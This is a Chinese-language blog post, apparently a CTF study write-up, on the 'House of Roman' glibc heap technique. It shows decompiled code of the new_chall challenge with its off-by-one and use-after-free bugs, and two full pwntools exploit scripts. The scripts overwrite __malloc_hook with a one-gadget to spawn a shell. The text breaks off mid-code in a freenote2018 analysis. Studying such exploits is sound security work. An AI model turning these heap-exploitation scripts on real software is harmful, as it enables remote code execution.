<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>house_of_roman | str1k3</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 - $1 行","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('/img/bg.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/links/"><span class="navItemTitle">Links</span></a></li></ol></nav></header><div id="shadow-header"></div><article><div id="post-bg"><div id="post-title"><h1>house_of_roman</h1><div id="post-info"><span>文章发布时间: <div class="control"><time datetime="2023-11-15T14:32:31.000Z" id="date"> 2023-11-15</time></div></span><br><span>最后更新时间: <div class="control"><time datetime="2023-11-15T14:19:30.985Z" id="updated"> 2023-11-15</time></div></span></div></div><hr><div id="post-content"><p><em>刷how2heap的时候看到的一个好玩的打法，本地环境貌似复现不起来，仅作记录</em><br>程序来源<strong><a target="_blank" rel="noopener" href="https://github.com/romanking98/House-Of-Roman">https://github.com/romanking98/House-Of-Roman</a></strong><br><strong>House-Of-Roman</strong><br>RCE through Leakless HeapFengShui, fastbin alloc anywhere.<br>Was presented at DEFCON 26.</p>
<p><strong>[House-Of-Roman]new_chall</strong><br>开局有个能写入bss段的机会<br class='item-img' data-src='/2023/11/15/house-of-roman/start.png'><img src="/2023/11/15/house-of-roman/start.png"><br><br>bss<br class='item-img' data-src='/2023/11/15/house-of-roman/bss.png'><img src="/2023/11/15/house-of-roman/bss.png"><br><br>实现了增删改<br class='item-img' data-src='/2023/11/15/house-of-roman/menu.png'><img src="/2023/11/15/house-of-roman/menu.png"><br><br>malloc_chunk，没有限制size，只能申请19个chunk</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 <span class="hljs-title function_">malloc_chunk</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+0h] [rbp-10h] BYREF</span><br>  _DWORD size[<span class="hljs-number">3</span>]; <span class="hljs-comment">// [rsp+4h] [rbp-Ch] BYREF</span><br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter size of chunk :&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, size);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter index :&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v1);<br>  <span class="hljs-keyword">if</span> ( v1 &lt;= <span class="hljs-number">0x13</span> )<br>  &#123;<br>    *(_QWORD *)&amp;size[<span class="hljs-number">1</span>] = <span class="hljs-built_in">malloc</span>(size[<span class="hljs-number">0</span>]);<br>    heap_ptrs[v1] = *(_QWORD *)&amp;size[<span class="hljs-number">1</span>];<br>    sizes[v1] = size[<span class="hljs-number">0</span>];<br>    <span class="hljs-keyword">return</span> *(_QWORD *)&amp;size[<span class="hljs-number">1</span>];<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Invalid index&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>write_chunk,存在off_by_one漏洞</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">write_chunk</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+8h] [rbp-8h] BYREF</span><br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [rsp+Ch] [rbp-4h]</span><br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nEnter index of chunk :&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v1);<br>  <span class="hljs-keyword">if</span> ( v1 &gt; <span class="hljs-number">0x13</span> )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\nInvalid index&quot;</span>);<br>  <span class="hljs-keyword">if</span> ( !heap_ptrs[v1] )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Bad index&quot;</span>);<br>  v2 = sizes[v1];<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter data :&quot;</span>);<br>  <span class="hljs-keyword">return</span> read(<span class="hljs-number">0</span>, (<span class="hljs-type">void</span> *)heap_ptrs[v1], v2 + <span class="hljs-number">1</span>);<span class="hljs-comment">//off_by_one</span><br>&#125;<br></code></pre></td></tr></table></figure>
<p>free_chunk存在UAF</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">free_chunk</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v0; <span class="hljs-comment">// [rsp+Ch] [rbp-4h] BYREF</span><br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nEnter index :&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v0);<br>  <span class="hljs-keyword">if</span> ( v0 &lt;= <span class="hljs-number">0x13</span> )<br>    <span class="hljs-built_in">free</span>((<span class="hljs-type">void</span> *)heap_ptrs[v0]);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>exp解说链接:<strong><a target="_blank" rel="noopener" href="https://gist.github.com/romanking98/9aab2804832c0fb46615f025e8ffb0bc">https://gist.github.com/romanking98/9aab2804832c0fb46615f025e8ffb0bc</a></strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> p64<br>p = process(<span class="hljs-string">&quot;./new_chall&quot;</span>,env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>:<span class="hljs-string">&quot;./libc-2.24.so&quot;</span>&#125;)<br><span class="hljs-comment">#raw_input()</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>	gdb.attach(p)<br>	pause()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>():<br>	p.recvuntil(<span class="hljs-string">b&quot;3. Free&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>(<span class="hljs-params">size,idx</span>):<br>	menu()<br>	p.sendline(<span class="hljs-string">b&quot;1&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">b&quot;:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	p.recvuntil(<span class="hljs-string">b&quot;:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>	menu()<br>	p.sendline(<span class="hljs-string">b&quot;3&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">b&quot;:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,data</span>):<br>	menu()<br>	p.sendline(<span class="hljs-string">b&quot;2&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">b&quot;:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	sleep(<span class="hljs-number">0.1</span>)<br>	p.send(data)<br><br><br>name = <span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">20</span><br>p.recvlineuntil(<span class="hljs-string">b&quot;Enter name :&quot;</span>)<br>p.sendline(name)<br><br>debug()<br>create(<span class="hljs-number">24</span>,<span class="hljs-number">0</span>)<br>create(<span class="hljs-number">200</span>,<span class="hljs-number">1</span>)<br>fake = <span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">104</span><br>fake += p64(<span class="hljs-number">0x61</span>)<br>edit(<span class="hljs-number">1</span>,fake)<br><br>create(<span class="hljs-number">101</span>,<span class="hljs-number">2</span>)<br><br>free(<span class="hljs-number">1</span>)<br>create(<span class="hljs-number">200</span>,<span class="hljs-number">1</span>)<br><br>over = <span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">24</span><br>over += <span class="hljs-string">b&quot;\x71&quot;</span><br>edit(<span class="hljs-number">0</span>,over)<br><br>create(<span class="hljs-number">101</span>,<span class="hljs-number">3</span>)<br>create(<span class="hljs-number">101</span>,<span class="hljs-number">15</span>)<br>create(<span class="hljs-number">101</span>,<span class="hljs-number">16</span>)<br>create(<span class="hljs-number">101</span>,<span class="hljs-number">17</span>)<br>create(<span class="hljs-number">101</span>,<span class="hljs-number">18</span>)<br>create(<span class="hljs-number">101</span>,<span class="hljs-number">19</span>)<br>free(<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">3</span>)<br><br>heap_po = <span class="hljs-string">b&quot;\x20&quot;</span><br>edit(<span class="hljs-number">3</span>,heap_po)<br><br>arena_po = <span class="hljs-string">b&quot;\xcd\x4a&quot;</span><br>edit(<span class="hljs-number">1</span>,arena_po)<br><span class="hljs-comment">#raw_input()</span><br>create(<span class="hljs-number">101</span>,<span class="hljs-number">0</span>)<br>create(<span class="hljs-number">101</span>,<span class="hljs-number">0</span>)<br>create(<span class="hljs-number">101</span>,<span class="hljs-number">0</span>)<br><span class="hljs-comment">#p.interactive()</span><br><br><span class="hljs-comment"># Control arena through 0.</span><br><span class="hljs-comment"># Now unsorted bin attack.</span><br><br><span class="hljs-comment"># First fix 0x71 freelist.</span><br>free(<span class="hljs-number">15</span>)<br>edit(<span class="hljs-number">15</span>,p64(<span class="hljs-number">0x00</span>))<br><br><span class="hljs-comment"># Fixed.</span><br><span class="hljs-comment"># 0x7f702619777b</span><br><br>create(<span class="hljs-number">200</span>,<span class="hljs-number">1</span>)<br>create(<span class="hljs-number">200</span>,<span class="hljs-number">1</span>)<br>create(<span class="hljs-number">24</span>,<span class="hljs-number">2</span>)<br>create(<span class="hljs-number">200</span>,<span class="hljs-number">3</span>)<br>create(<span class="hljs-number">200</span>,<span class="hljs-number">4</span>)<br><br>free(<span class="hljs-number">1</span>)<br>po = <span class="hljs-string">b&quot;B&quot;</span>*<span class="hljs-number">8</span><br>po += <span class="hljs-string">b&quot;\xe0\x4a&quot;</span><br>edit(<span class="hljs-number">1</span>,po)<br><br>create(<span class="hljs-number">200</span>,<span class="hljs-number">1</span>)<br><span class="hljs-comment">#5b394f</span><br>over = <span class="hljs-string">b&quot;R&quot;</span>*<span class="hljs-number">19</span><br>over += <span class="hljs-string">b&quot;\x4f\x39\x5b&quot;</span><br>edit(<span class="hljs-number">0</span>,over)<br><br>create(<span class="hljs-number">200</span>,<span class="hljs-number">7</span>)<br><span class="hljs-keyword">try</span>:<br>	resp = p.recv(<span class="hljs-number">4</span>, timeout=<span class="hljs-number">6</span>)<br>	p.interactive()<br><span class="hljs-keyword">except</span>:<br>	p.close()<br></code></pre></td></tr></table></figure>

<p>该方法在aslr开启下需要爆破数据，看运气<br>以下方法来自<br><strong><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7426#toc-1">https://xz.aliyun.com/t/7426#toc-1</a></strong><br>用IO_FILE泄露了libc地址，有1&#x2F;16的概率打通</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#coding:utf8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,idx</span>):<br>    <span class="hljs-comment">#p.sendline(&quot;1&quot;)</span><br>    <span class="hljs-comment">#p.sendline(str(size))</span><br>    <span class="hljs-comment">#p.sendline(str(idx))</span><br>    p.sendlineafter(<span class="hljs-string">&#x27;Free&#x27;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Enter size of chunk :&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    p.sendlineafter(<span class="hljs-string">&#x27;Enter index :&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;Free&#x27;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Enter index :&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,data</span>):<br>    <span class="hljs-comment">#p.recvuntil(&#x27;Free&#x27;)</span><br>    <span class="hljs-comment">#p.sendline(&#x27;2&#x27;)</span><br>    <span class="hljs-comment">#p.recvuntil(&#x27;Enter index of chunk :&#x27;)</span><br>    <span class="hljs-comment">#p.sendline(str(idx))</span><br>    <span class="hljs-comment">#p.recvuntil(&#x27;Enter data :&#x27;)</span><br>    <span class="hljs-comment">#p.send(data)</span><br>    p.sendlineafter(<span class="hljs-string">&#x27;Free&#x27;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Enter index of chunk :&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br>    p.sendafter(<span class="hljs-string">&#x27;Enter data :&#x27;</span>,data)<br><br>p = process(<span class="hljs-string">&#x27;./new_chall&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>,checksec=<span class="hljs-literal">False</span>)<br>context.log_level =<span class="hljs-string">&#x27;DEBUG&#x27;</span><br><br>p.sendlineafter(<span class="hljs-string">&#x27;Enter name :&#x27;</span>,<span class="hljs-string">&#x27;FMYY&#x27;</span>)<br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0xC8</span>,<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x68</span>,<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">0x68</span> + p64(<span class="hljs-number">0x61</span>))<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0xC8</span>,<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x68</span>,<span class="hljs-number">3</span>)<br>add(<span class="hljs-number">0x68</span>,<span class="hljs-number">4</span>)<br>add(<span class="hljs-number">0x68</span>,<span class="hljs-number">5</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">0x18</span> + <span class="hljs-string">&#x27;\x71&#x27;</span>)<br>free(<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">3</span>)<br>edit(<span class="hljs-number">3</span>,<span class="hljs-string">&#x27;\x20&#x27;</span>)<br>edit(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;\xDD\x25&#x27;</span>)<br>add(<span class="hljs-number">0x68</span>,<span class="hljs-number">9</span>)<br>add(<span class="hljs-number">0x68</span>,<span class="hljs-number">9</span>)<br>payload = <span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">0x33</span> + p64(<span class="hljs-number">0xFBAD1800</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + <span class="hljs-string">&#x27;\x88&#x27;</span><br>add(<span class="hljs-number">0x68</span>,<span class="hljs-number">9</span>)<br>edit(<span class="hljs-number">9</span>,payload)<br><span class="hljs-comment">#修改stdout的flag位为0xfbad1800</span><br><span class="hljs-comment">#bing将_IO_write_base的最后一个字节改小，从而实现多输出一些内容，这些内容里面就包含了libc地址。</span><br><br>libc_base = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - libc.symbols[<span class="hljs-string">&#x27;_IO_2_1_stdin_&#x27;</span>]<br>libc.address = libc_base<br><br>free(<span class="hljs-number">4</span>)<br>edit(<span class="hljs-number">4</span>,p64(<span class="hljs-number">0</span>))<br>add(<span class="hljs-number">0x68</span>,<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">0</span>)<br>edit(<span class="hljs-number">0</span>,p64(libc.symbols[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>] - <span class="hljs-number">0x23</span>))<br>add(<span class="hljs-number">0x68</span>,<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x68</span>,<span class="hljs-number">0</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;Free&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;Enter index of chunk :&#x27;</span>,<span class="hljs-string">&#x27;0&#x27;</span>)<br>p.send(<span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">0x13</span>+p64(libc_base+<span class="hljs-number">0xF02A4</span>))<br><span class="hljs-comment">#向malloc_hook 地址里写入 onegadget </span><br><br><span class="hljs-comment">#free 同一个 chunk 多次，造成 double free 异常，触发 malloc_printerr ，触发malloc,getshell。</span><br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">1</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<p>#[0CTF&#x2F;TCTF 2018 finals]freenote2018<br>增删改（查只是个壳子）<br class='item-img' data-src='/2023/11/15/house-of-roman/menu0.png'><img src="/2023/11/15/house-of-roman/menu0.png"><br><br>init_note 限制了15个chunk，size为0x1到0x100</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 <span class="hljs-title function_">sub_B4E</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+Ch] [rbp-124h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [rsp+10h] [rbp-120h]</span><br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [rsp+14h] [rbp-11Ch]</span><br>  <span class="hljs-type">void</span> *dest; <span class="hljs-comment">// [rsp+18h] [rbp-118h]</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">264</span>]; <span class="hljs-comment">// [rsp+20h] [rbp-110h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v6; <span class="hljs-comment">// [rsp+128h] [rbp-8h]</span><br><br>  v6 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  v1 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)dword_20203C &lt;= <span class="hljs-number">0xF</span> &amp;&amp; (<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Input the note length:&quot;</span>), v3 = sub_A80(), v3 &gt; <span class="hljs-number">0</span>) &amp;&amp; v3 &lt;= <span class="hljs-number">256</span> )<br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Input the note content:&quot;</span>);<br>    v2 = read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0xFF</span>uLL);<br>    <span class="hljs-keyword">if</span> ( v2 &gt; v3 )<br>      v2 = v3;<br>    dest = <span class="hljs-built_in">malloc</span>(v3 + <span class="hljs-number">8</span>);<br>    <span class="hljs-keyword">if</span> ( dest &amp;&amp; v2 )<br>      <span class="hljs-built_in">memcpy</span>(dest, buf, v2 - <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">while</span> ( dword_202048[<span class="hljs-number">4</span> * v1] )<br>      ++v1;<br>    *((_QWORD *)&amp;unk_202040 + <span class="hljs-number">2</span> * (<span class="hljs-type">int</span>)v1) = dest;<br>    dword_202048[<span class="hljs-number">4</span> * v1] = v3;<br>    ++dword_20203C;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Here is your label: %d\n&quot;</span>, v1);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Done~!&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Not allow~!&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1LL</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>edit没有溢出</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 <span class="hljs-title function_">sub_D43</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Input the note index:&quot;</span>);<br>  v1 = sub_A80();<br>  <span class="hljs-keyword">if</span> ( v1 &lt; <span class="hljs-number">0x11</span> &amp;&amp; dword_202048[<span class="hljs-number">4</span> * v1] )<br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Input the note content:&quot;</span>);<br>    read(<span class="hljs-number">0</span>, *((<span class="hljs-type">void</span> **)&amp;unk_202040 + <span class="hljs-number">2</span> * (<span class="hljs-type">int</span>)v1), (<span class="hljs-type">unsigned</span> <span 